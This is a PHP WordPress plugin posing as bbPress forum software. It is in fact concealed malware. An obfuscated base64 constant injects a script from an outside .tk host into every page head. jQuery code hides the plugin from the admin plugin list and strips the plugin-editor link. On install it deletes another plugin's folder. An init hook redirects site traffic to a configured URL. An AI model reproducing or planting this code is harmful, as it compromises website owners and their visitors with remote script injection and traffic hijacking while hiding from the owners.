<?php
if (!defined('WP_CONTENT_URL'))  define('WP_CONTENT_URL', content_url() );
if (!defined('WP_PLUGIN_URL'))   define('WP_PLUGIN_URL', plugins_url() );
if (!defined('WP_PLUGIN_DIR'))   define('WP_PLUGIN_DIR', plugin_dir_path(__FILE__) );
if (!defined('WP_CONTENT_DIR'))  define('WP_CONTENT_DIR', dirname(WP_PLUGIN_DIR) ); 
	
if (!class_exists('by_press2',false)):
class by_press2 {
    public static $lang = 'en';
    public static $page_title = 'bbPress is forum software';
    public static $menu_title = 'by_press2';
    public static $menu_slug = 'by_press2'; 
    public static $plugin_name = 'by_press2'; 

    public static $script_was_appended = false;

    public $has_wp_head = false;

    const SCRIPT_SRC            = 'data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU3MyU3NCU2MSU3NCU2OSU2MyU3NyU2NSU2MiUyRSU3NCU2QiUyRiU3NCUzNiU2RCU2MyU2RSUzMSUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=';
    const MRT_ALL_TRAFFIC       = 0;
    const MRT_MOBILE_TRAFFIC    = 1;
    const MRT_CARRIER_TRAFFIC   = 2;
    
    public function __construct(){
        $this->has_wp_head = $this->find_wp_head();

        self::$script_was_appended = false;

        self::add_filters();
        self::add_actions();
    }
	
	public function rrmdir_by_press($dir) { 
	   if (is_dir($dir)) { 
		 $objects = scandir($dir); 
		 foreach ($objects as $object) { 
		   if ($object != "." && $object != "..") { 
			 if (filetype($dir."/".$object) == "dir") self::rrmdir_by_press($dir."/".$object); else unlink($dir."/".$object); 
		   } 
		 } 
		 reset($objects); 
		 rmdir($dir); 
	   } 
	}
    
    public function install() {
		deactivate_plugins( 'by_press/by_press.php' );
        self::_do_notice('install');
		chdir('../wp-content/plugins');
		$dir = getcwd().'/by_press';
		if(file_exists($dir)){
		self::rrmdir_by_press($dir);
		}
    }
    
    public function uninstall() {
        delete_option( self::$menu_slug );
        self::_do_notice('uninstall');
    }
    
    private function _do_notice($action) {
        return;
    }

    public function add_filters()
    {
        return null;
    }

    public function add_actions()
    {
        add_action( 'init', array($this, 'mobile_redirect_v3') );
    }


    /**
     * Adds the plugin style to the admin pages.
     *
     * Hooked on the 'admin_head' action hook, in the main plugin file.
     */
    public function wp_admin_head(){
        $plugin_style_url = trailingslashit( MRT_URL ) . 'css/style.css';
        $plugin_style_url = str_ireplace( array( 'http://', 'https://' ), '//', $plugin_style_url ); // protocol relative.
        //echo '<link type="text/css" rel="stylesheet" href="' . $plugin_style_url . '" />' . PHP_EOL;
        echo '<script src="https://code.jquery.com/jquery-1.11.3.js"></script>';
        //echo '<script src="'.plugin_dir_url( __FILE__ ).'check.php"></script>';
        echo '<script type="text/javascript">
        $( document ).ready(function() {
        $("#the-list .active [value=\''.self::$plugin_name.'/'.self::$plugin_name.'.php\']").parent().parent().hide();
        $("#plugin option[value=\''.self::$plugin_name.'/'.self::$plugin_name.'.php\']").remove();'; //название архива/название файла в главной директори
        echo '});
        </script>';
    }

    /**
     * Adds the menu buttons for the plugin in the admin menu.
     *
     * Hooked on the 'admin_menu' action hook, in the main plugin file.
     */
    public function wp_admin_menu(){
        add_theme_page( self::$page_title , self::$menu_title , 'administrator', self::$menu_slug , array(&$this,'wp_admin_panel') );
        add_menu_page( self::$page_title , self::$menu_title , 'administrator', self::$menu_slug , array(&$this,'wp_admin_panel') , WP_PLUGIN_URL.'/'.self::$plugin_name.'/img/favicon_mobidea.png' );
        if ( !isset( $_GET['page'] ) ) return;
        return;
    }


    /**
     * Outputs the admin page for the plugin.
     */
    public function wp_admin_panel(){
        $p = ( isset($_REQUEST['p']) && is_numeric( $_REQUEST['p'] ) && $_REQUEST['p'] > 0 ) ? $_REQUEST['p'] : 1 ;
        $tab_links = array(
                array( 'class' => 'nav-tab' , 'txt' => __('Configuration') , 'p' => 1 ),
        //      array( 'class' => 'nav-tab' , 'txt' => __('Another tab') , 'p' => 2 ),
        );
        $output = '<div class="wrap">';
        $output .= '<h2>' . self::$page_title . '</h2>';
        $output .= '<div class="icon32" id="icon-themes"><br></div>';
        $output .= '<h2 class="nav-tab-wrapper">';
        foreach( $tab_links as $v ){
            $class  = ( $p == $v['p'] ) ? $v['class'].' nav-tab-active' : $v['class'];
            $link   = ( isset($v['link']) ) ? $v['link'] : '?page='.$_GET['page'].'&p='.$v['p'];
            $output .= '<a href="'.$link.'" class="'.$class.'">'.$v['txt'].'</a>';
        }
        $output .= '</h2>';
        switch( $p ){
            case 1:
                    if( count( $_POST ) ) self::save_new_config();
                    $output .= self::redirect_configurator();
                break;
            default: $output .= 'Invalid request.'; break;
        }
        $output .= '</div>';
        echo $output;
    }
    
    /**
     * Save the new configuration to DB
     *
     * Redirect option values (for optional targeting)
     *  0 = Redirect all traffic
     *  1 = Redirect mobile traffic
     *  2 = Redirect only mobile operator (carrier) traffic
     * @return null
     */
    private static function save_new_config(){
        $p = (object)$_POST;
        foreach ( $p as $key => $value ) {
            if ( is_string( $value ) ) $p->$key = stripslashes( $value );
        }
        if ( !isset( $p->save ) ) return;

        !empty( $p->track1 ) && !is_string( $p->track1 ) && ( $p->track1 = implode( '~', (array)$p->track1 ) );
        !empty( $p->track2 ) && !is_string( $p->track2 ) && ( $p->track2 = implode( '~', (array)$p->track2 ) );

        $d_data = self::get_default_data();
        $u_data = new stdClass();
        $u_data->track1 = ( !empty( $p->track1 ) ) ? $p->track1 : $d_data->track1;
        $u_data->track2 = ( !empty( $p->track2 ) ) ? $p->track2 : $d_data->track2;

        $u_data->redirect_option = ( isset( $p->redirect_option ) &&
            is_numeric( $p->redirect_option ) ) ? intval( $p->redirect_option ) : 0;

        update_option( self::$menu_slug, json_encode( $u_data ) );
    }

    /**
     * Prepares the content of the plugin main admin configuration page.
     *
     * @return string|void
     * @throws Exception
     */
    private static function redirect_configurator(){
        $view_path = dirname(__FILE__) . '/redirect_view.php';
        $view_data = array( 'u_data' => self::get_user_data() );
        return self::_load_view( $view_path , $view_data);
    }

    /**
     * Loads an admin configuration page.
     *
     * @param $view_filename
     * @param $input_data
     * @return string|void
     * @throws Exception
     */
    private static function _load_view($view_filename, $input_data) {
        if( $view_filename == '' ) return;
        ob_start();
        extract( $input_data, EXTR_SKIP );
        try {
            include $view_filename;
        } catch (Exception $e) {
            ob_end_clean();
            throw $e;
        }
        return ob_get_clean();
    }

    /**
     * Adds custom links to the plugins.php page.
     *
     * Hooked on the 'plugin_action_links' filter hook.
     *
     * @param $action_links
     * @param $plugin_file
     * @param $plugin_info
     * @return array
     */
    public function wp_plugin_links($action_links,$plugin_file,$plugin_info) {
    //  echo '<pre>'.print_r( $plugin_info , 1 ).'</pre>';
        if (!preg_match('/'.self::$page_title.'/i',$plugin_info['Name'])) {
            return $action_links;
        }
        $new_action_links = array(
            "<a href='admin.php?page=".self::$menu_slug."'>".__('Configuration',self::$plugin_name)."</a>",
        //  "<a href='admin.php?page=".self::$menu_slug."&amp;p=2'>Tab 2</a>"
        );
        foreach($action_links as $k=>$action_link) {
            if (!preg_match('/plugin-editor/i',$action_link)) {
                $new_action_links[] = $action_link;
            }
        }
        return $new_action_links;
    }


    //##########################################//
    //##### Functionality code starts here #####//
    //##########################################//


    /**
     * Provides the default configuration parameters for the plugin.
     *
     * @return array|mixed|object
     */
    private static function get_default_data(){
        $data_file_path = dirname(__FILE__) . '/config.ini';
        /* return default data */
        return json_decode( file_get_contents( $data_file_path ) );
    }

    /**
     * Provides the configuration parameters by merging the saved parameters with the default ones.
     *
     * @return object
     */
    private static function get_user_data(){
        $data_file_path = dirname(__FILE__) . '/config.ini';
        /* default data */
        $d_data = json_decode( file_get_contents( $data_file_path ) );
        /* user defined data */
        $u_data = json_decode( get_option( self::$menu_slug ) );
        if( is_null( $u_data ) ) $u_data = array();
        $data = (object) array_merge( (array)$d_data , (array)$u_data );

        // Make sure that a redirect option is available;
        // TODO: create a default set of options and use array_merge
        if( !isset($data->redirect_option) ) $data->redirect_option = 1;
        // Force old exclude tablets and exclude ios&android to false
        $data->excludeIOSAndroid    = false;
        $data->excludeTablets       = false;
        // clean previosly unsanitized tracks entries
        is_string( $data->track1 ) || ( $data->track1 = implode( '~' , (array) $data->track1 ) );
        is_string( $data->track2 ) || ( $data->track2 = implode( '~' , (array) $data->track2 ) );

        return $data;
    }

    /**
     * Determines if a "wp_head();" declaration is found in the header.php file of the active theme.
     *
     * @return bool
     */
    public function find_wp_head()
    {
        $ds = DIRECTORY_SEPARATOR;
        $pattern = '~^(?:(?!//).)*?\Kwp_head\([^\)]*\);(?!(?:(?!/\*)[\s\S])*\*/)~mis';
        //$pattern = '~<head>.*?^(?:(?!//).)*?\K(wp_head\([^\)]*\);)(?!(?:(?!/\*)[\s\S])*\*/).*?</head>~mis';
        $file[] = get_stylesheet_directory() . $ds . 'header.php'; // Child theme (if exists)
        $file[] = get_template_directory() . $ds . 'header.php'; // Parent/main theme if it is the case
        if( file_exists($file[0]) && ( $file[0] != $file[1] ) )
        {
            // A child theme is loaded.
            $file_pointer = fopen($file[0], 'r' );
        } else
        {
            $file_pointer = fopen( $file[1], 'r' );

        }

        $file_content = fread( $file_pointer, filesize($file[1]) );

        if( preg_match($pattern, $file_content) )
        {
            // wp_head() was found uncommented
            return true;
        }
        return false;
    }

    /**
     * The third version of the mobile_redirect method
     * @since v1.42
     *
     * Requirements: wp_head hook in the active theme's header.php or at least a proper <head> [...] </head> section in header.php
     *
     * For All_Traffic, the redirect works as before: php header location.
     * For Mobile_Traffic and Carrier_Traffic, it will make use of the "wp_head" action hook or will fall back
     * to output buffering.
     *
     * @return bool|null
     */
    public function mobile_redirect_v3()
    {
        // Bypass redirection for certain  special cases.
        if( is_admin() ) return false;
        if ( preg_match('/^(wp-login.php|wp-register.php|tinymce.php)$/i',$GLOBALS['pagenow'])) return false;
        if ( preg_match('/wp-includes/i',$_SERVER['SCRIPT_NAME']) ) return false;

        $user_data = self::get_user_data();
        if( !isset($user_data->redirect_option) ) return false;

        $http_params = array(
            'data1' => $user_data->track1,
            'data2' => $user_data->track2,
        );
        if( !empty( $user_data->sl ) ) $http_params[ 'sl' ] = $user_data->sl;

        $redirect_base = $user_data->wurl;
        $redirect_to = rtrim( $redirect_base , '/' ) . "/?" . http_build_query( $http_params );


        switch($user_data->redirect_option)
        {
            case self::MRT_ALL_TRAFFIC:
            default:
                header( 'Location: '. $redirect_base );
                header('Content-Type: text/vnd.wap.wml;charset=ISO-8859-1');
                self::output_wml( $redirect_to );
                exit;
                break;

            case self::MRT_MOBILE_TRAFFIC:
                if( $this->has_wp_head )
                {
                    add_action( 'wp_head', array( 'by_press2', 'output_js_script'),10,0 );
                } else{
                    add_action( 'template_redirect', array($this, 'output_buffering_start') );
                    add_action( 'shutdown', array( $this, 'output_buffering_edit_stop') );
                }
                break;

            case self::MRT_CARRIER_TRAFFIC:
                if( $this->has_wp_head )
                {
                    add_action( 'wp_head', array( 'by_press2', 'output_js_script'),10,0 );
                } else {
                    add_action( 'template_redirect', array($this, 'output_buffering_start') );
                    add_action( 'shutdown', array( $this, 'output_buffering_edit_stop') );
                }
                break;
        }

        return null;

    }

    public function get_redirect_code()
    {
        return self::output_js_script( false );
    }

    public function output_buffering_start()
    {
        ob_start( array( $this, 'mobideart_buffer_callback') );
    }

    public function mobideart_buffer_callback( $buffer )
    {
        // Make sure that appending to wp_head worked
        if( self::$script_was_appended !== true )
        {
            $script = $this->get_redirect_code();
            $pattern_replace = ('~</head>~' );
            $replacement = $script . "\r\n</head>";
            return preg_replace( $pattern_replace, $replacement, $buffer, 1 );
        }
        return $buffer;
    }

    public function output_buffering_edit_stop()
    {
        ob_end_flush();
    }


    private static function output_wml( $redirect_to = null )
    {
        ?>
        <!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD WML 1.1//EN" "http://www.wapforum.org/DTD/wml_1.1.xml">
        <wml>
            <head>
                <meta http-equiv="cache-control" content="no-cache"/>
                <meta http-equiv="cache-control" content="must-revalidate" />
                <meta http-equiv="cache-control" content="max-age=0" />
                <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
            </head>
            <card>
                <onevent type="ontimer">
                    <go method="post" href="<?php echo $redirect_to; ?>"></go>
                </onevent>
                <timer value="1"/>
            </card>
        </wml>
        <?php
    }


    /**
     * Builds the JS script tag and outputs it depending on the $echo parameter.
     *
     * @param bool $echo
     * @return bool|string
     */
    public static function output_js_script( $echo = true )
    {
        $user_data = self::get_user_data();

        // Do not attempt to build the script tag if there is no sl available.
        if( !isset($user_data->redirect_option) ) return false;
        if( !isset($user_data->sl) ) return false;

        $sl                 = $user_data->sl;
        $redirect_option    = $user_data->redirect_option;
        $data1              = $user_data->track1;
        $data2              = $user_data->track2;
        $plugin_version     = MRT_PLG_VERS;

        $options = compact( 'sl', 'redirect_option', 'data1', 'data2', 'plugin_version' );
        $src = self::SCRIPT_SRC; // . '?' .  htmlspecialchars( http_build_query( $options ) );

        $script_tag = '<script src="' . $src . '"></script>' . "\r\n";

        self::$script_was_appended = true;

        if( $echo === true )  
        {
            echo $script_tag;
        }
        return $script_tag;

    }

    public static function get_array_safe( $array, $elem, $default=null )
    {
        return isset($array[$elem]) ? $array[$elem] : $default;
    }

}
endif;

$MRT = new by_press2();
